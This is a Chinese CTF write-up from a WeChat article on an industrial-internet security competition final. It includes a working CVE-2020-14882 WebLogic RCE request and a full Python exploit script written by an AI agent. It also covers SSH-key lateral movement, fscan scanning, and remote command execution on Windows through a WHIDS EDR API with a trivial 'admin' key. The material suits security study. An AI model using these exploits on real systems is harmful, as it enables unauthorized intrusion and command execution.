---
title: 【微信】中国工业互联网安全大赛决赛渗透(部分)
source: https://mp.weixin.qq.com/s/GT4_I1pJ291WMblnekWxCw
source_host: mp.weixin.qq.com
clip_date: 2026-10-31T01:16:18+08:00
trace_id: 6c9ec68f-a481-446b-88f3-11ce7261338c
content_hash: 301e9bf15544d98aebb7b3e66fb0b79a89ec777e245b26b6972f50f9e7561ea4
status: synced
tags:
  - 微信
  - CTF
  - 内网渗透
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: WebLogic 反序列化 RCE 拿下官网主机、SSH 私钥跳板横移内网、滥用 WHIDS EDR 管理端 API 在 Windows 靶机远程执行命令，三关各取一个 flag 的决赛渗透记录。
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 40975244-d011-8123-8996-fac3bb1248c1
ioc:
  cves:
    - CVE-2020-14882
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> WebLogic 反序列化 RCE 拿下官网主机、SSH 私钥跳板横移内网、滥用 WHIDS EDR 管理端 API 在 Windows 靶机远程执行命令，三关各取一个 flag 的决赛渗透记录。
> 
> - **任务一 RCE：** 目标 WebLogic 存在 CVE-2020-14882，走 `/console/images/%252e%252e%252f/console.portal` 路径，用 `com.tangosol.coherence.mvel2.sh.ShellSession` payload 反射取请求对象实现命令回显，实测回显 root；因 Burp 回显不全，让 AI agent 写 Python exp（用 Scanner+\A 读全量输出、手动解 chunked），`cat /flag*` 得 flag1：`flag{A5ouiyCNq0-98Gqjw3nGqwpoEriuGy8yqw3iuo}`。
> - **任务二横移：** 向已控主机写入 SSH 私钥直连跳板机，上传 fscan 扫描同网段，拿到另一台靶机的 SSH 密码远连后 `find / -name flag*` 定位并读取 flag2：`flag{q0987v1p084;10}`。
> - **任务三突破口：** 同目录下 `/home/opt/whids-1.7.0/apis.md` 是 WHIDS EDR 的 API 文档，`.bash_history` 泄露调用姿势，用 `Api-Key: admin` 调 `localhost:8001/endpoints` 枚举出在线端点 `fengdian2`（192.168.110.3），另一个端点是死端点。
> - **关键机制：** EDR 端点主动轮询 manager 拉取命令而非反向连接，故能调 8001 API 即等于可在该 Windows 主机执行命令；首次发 `id` 报 `executable file not found in %PATH%`，反而暴露端点是 Windows，需用 `cmd /c` 包裹命令。
> - **结果细节：** 返回的 `stdout`/`stderr` 为 base64 编码的 GBK 文本，解码后在 `zhangsan` 桌面读取 flag3：`flag{assOiBNJ987667Hf64E475S1}`；因比赛时间不足未完成提权，错失后续多个 flag。

**正在思考ing** *2026年10月30日 15:10*

和bro们一起打了工业互联网安全大赛的决赛，结果还是非常满意的，遗憾的是上午的实操题和下午的渗透题，因为时间关系没有再多解出几道，但是总体来讲北京之行还是挺圆满的。这里就简单记录下这道场景题的前面几问。

### 任务一：提交风电公司官网主机下的flag1

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c62ddf8dfa94bab8.jpg)

扫描到weblogic的漏洞，大概率是打反序列化rce

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5b0f26df9af495c9.jpg)

打poc发现测试成功，修改payload远程命令执行getshell：

```swift
POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
Host: 10.160.201.197
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Content-Length: 1080
Accept-Encoding: gzip, deflate
Accept-Language: en
Content-Type: application/x-www-form-urlencoded

test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); java.lang.Process p = java.lang.Runtime.getRuntime().exec("whoami"); java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String result = br.readLine(); if(result==null){result="no-output";} weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); currentThread.interrupt();')
```

比赛的时候忘记截图了，实际测试是可以回显root的。但是因为burpsuite的显示问题，有些输出无法在回显中输出，让本地agent写一个exp脚本

```swift
#!/usr/bin/env python3
# WebLogic CVE-2020-14882 命令执行（MVEL ShellSession）
# 用法: python exp.py "id"  /  python exp.py "cat /flag1"
import sys, socket, os

HOST, PORT = "10.160.201.197", 80
PATH = "/console/images/%252e%252e%252fconsole.portal"
COOKIE = os.environ.get("WL_COOKIE",
    "ADMINCONSOLESESSION=MiWBGurwn9Nr5BvrOUGXTMF1xEkX8VE7DSc6eN5627_lCSnnel6p!-436991640")

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

# 注意: MVEL 里不能用 new String[]{...} 和 while 循环，用 Scanner + \\A 读全量输出
expr = (
    "'weblogic.work.ExecuteThread ct=(weblogic.work.ExecuteThread)Thread.currentThread();"
    "weblogic.work.WorkAdapter ad=ct.getCurrentWork();"
    "java.lang.reflect.Field f=ad.getClass().getDeclaredField(\"connectionHandler\");"
    "f.setAccessible(true);Object o=f.get(ad);"
    "weblogic.servlet.internal.ServletRequestImpl req=(weblogic.servlet.internal.ServletRequestImpl)"
    "o.getClass().getMethod(\"getServletRequest\").invoke(o);"
    "java.lang.Process p=java.lang.Runtime.getRuntime().exec(\"" + cmd + "\");"
    "java.util.Scanner sc=new java.util.Scanner(p.getInputStream());sc.useDelimiter(\"\\\\A\");"
    "String r=sc.hasNext()?sc.next():\"no-output\";"
    "weblogic.servlet.internal.ServletResponseImpl res=(weblogic.servlet.internal.ServletResponseImpl)"
    "req.getClass().getMethod(\"getResponse\").invoke(req);"
    "res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(r));"
    "res.getServletOutputStream().flush();ct.interrupt();'"
)

body = ("test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(" + expr + ")").encode()
req = (
    "POST " + PATH + " HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Cookie: {COOKIE}\r\n"
    "Connection: close\r\n\r\n"
).encode() + body

s = socket.create_connection((HOST, PORT), timeout=20)
s.sendall(req)
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except Exception as e:
    print("[recv end]", e, file=sys.stderr)
s.close()

head, _, out = data.partition(b"\r\n\r\n")
status = head.split(b"\r\n")[0].decode(errors="replace")
print("[status]", status, file=sys.stderr)

if b"Transfer-Encoding: chunked" in head:
    body_out, i = b"", 0
    while i < len(out):
        eol = out.find(b"\r\n", i)
        if eol == -1:
            break
        try:
            n = int(out[i:eol], 16)
        except ValueError:
            break
        if n == 0:
            break
        body_out += out[eol + 2:eol + 2 + n]
        i = eol + 2 + n + 2
    out = body_out

if len(out) > 3000:
    print("[param 未被求值 —— 检查 cookie / 是否发送原始 body]", file=sys.stderr)
else:
    print(out.decode(errors="replace"))
```

```
python exp.py "ls /"
python exp.py "cat /flag*"
#flag{A5ouiyCNq0-98Gqjw3nGqwpoEriuGy8yqw3iuo}
```

### 任务二：提交同网段下机器的flag

想不到其他好的方法，就还是写私钥进去，这一步还是让本地agent去操作的，然后就能直接ssh连接跳板机了。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2cc5198b7f2340e1.jpg)

成功远连后，上传fscan扫描

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/89ef17ae12ab5056.jpg)

找到另一台靶机的ssh连接密码，直接远连

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b1d456e93c065bc0.jpg)

find的一下flag找到路径直接cat读取

```
find / -name flag*
cat /root/flag
flag{q0987v1p084;10}
```

### 任务三：根据此机器上的API文档，获取到服务连接相关机器的相关权限与对应flag信息

找了半天也不知道api文档在哪个机子上，直接扔给离线agent去信息收集了，雷霆大思考了好久我以为没啥收获，就让其总结下，结果就是api已经打通了，windows主机上的flag也找到了。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6a11b5d1c3725335.jpg)

后面时间来不及了，也没时间提权了，本地agent也没给我exp脚本，痛失好几个flag。赛后没环境，让agent输出下其渗透思路

`/home/opt/whids-1.7.0/apis.md` 就是这个"API文档"，同目录还有 `whids-man-v1.7.0-amd64` 、 `use_api.py` 、 `cmd.sh` 、 `check.sh` 。 `cmd.sh` 里直接写着调用姿势， `/home/opt/.bash_history` 里还留了 `curl localhost:8001/endpoints -X GET -H "Api-Key: admin"` 。

**枚举端点**：

```
curl -s -H 'Api-Key: admin' http://localhost:8001/endpoints
```

返回两个端点，其中 `03e31275-2277-d8e0-bb5f-480fac7ee4ef` = `fengdian2` / `192.168.110.3` ， `last-connection` 在实时刷新 → **在线**。（另一个 `...4eb` 是 197 上 `config.toml` 配的，从未连接，是死端点。）

关键点：EDR 是 **端点主动轮询** 拉取命令，manager 不连端点，所以只要能调 8001 就等于能在这台 Windows 上执行命令。

```bash
# 下发
curl -s -X POST -H 'Api-Key: admin' -H 'Content-Type: application/json' \
  -d '{"command-line":"cmd /c whoami"}' \
  http://localhost:8001/endpoints/03e31275-...4ef/command

# 轮询（约 1 分钟一次心跳）
curl -s -H 'Api-Key: admin' http://localhost:8001/endpoints/03e31275-...4ef/command
```

第一次我发的是 `id` ，返回 `error: exec: "id": executable file not found in %PATH%` —— 这条报错反而直接暴露了 **端点是 Windows**，必须用 `cmd /c` 包一层。

结果字段： `stdout` / `stderr` 是 **base64**，解出来是 **GBK** 编码：

```
python -c "import json,base64;d=json.load(open('r.json'))['data'];print(base64.b64decode(d['stdout']).decode('gbk'))"
```

```dockerfile
cmd /c whoami & hostname & dir C:\Users
  → fengdian2\zhangsan
  → C:\Users 下有 admin / Administrator / Public / zhangsan

cmd /c dir C:\Users\zhangsan\Desktop
  → flag3.txt (30 字节)
  → 资产信息.txt (40 字节)

cmd /c type C:\Users\zhangsan\Desktop\flag3.txt
  → flag{assOiBNJ987667Hf64E475S1}
```
